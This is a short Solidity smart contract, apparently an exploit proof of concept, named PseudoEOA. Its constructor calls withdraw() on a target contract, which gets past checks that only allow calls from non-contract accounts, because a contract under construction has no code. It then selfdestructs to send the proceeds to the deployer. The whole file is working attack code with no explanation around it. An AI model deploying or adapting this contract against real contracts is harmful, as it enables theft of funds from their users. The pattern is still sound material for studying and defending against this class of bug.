pragma solidity 0.7.6;

contract PseudoEOA {
    constructor(address target) {
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "call-falied");
        selfdestruct(msg.sender);
        // payable(msg.sender).transfer(address(this).balance);
    }
}
